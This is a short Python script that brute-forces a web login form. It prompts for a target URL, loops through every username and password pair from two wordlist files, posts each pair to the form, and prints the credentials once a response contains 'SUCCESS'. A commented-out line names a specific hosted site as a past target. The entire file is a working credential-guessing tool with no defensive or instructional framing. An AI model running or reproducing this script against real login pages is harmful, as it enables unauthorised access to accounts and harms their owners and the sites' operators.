import requests, os
from colorama import Fore

os.system('cls')
#url = "http://ninja.mywebcommunity.org/"
url = input("Enter target url: ")
fuser = open("userlist.txt",'r').read().splitlines()
fpass = open("passlist.txt",'r').read().splitlines()
for user in fuser:
	for passwd in fpass:
		r = requests.post(url, data={"user":user,"pass":passwd})
		if "SUCCESS" in r.text:
			print(f" {Fore.WHITE}[{Fore.GREEN}Success{Fore.WHITE}] {Fore.CYAN}{url} {Fore.YELLOW}Trying: [User: {user} Password: {passwd} {Fore.WHITE}")
			print(f" Credentials Found: User: {user} | Password: {passwd}")	
			exit()
		else:
			print(f" {Fore.WHITE}[{Fore.RED}Error{Fore.WHITE}] {Fore.CYAN}{url} {Fore.YELLOW}Trying: -> {Fore.WHITE}User: {user} | Password: {passwd} {Fore.YELLOW} {Fore.WHITE}")
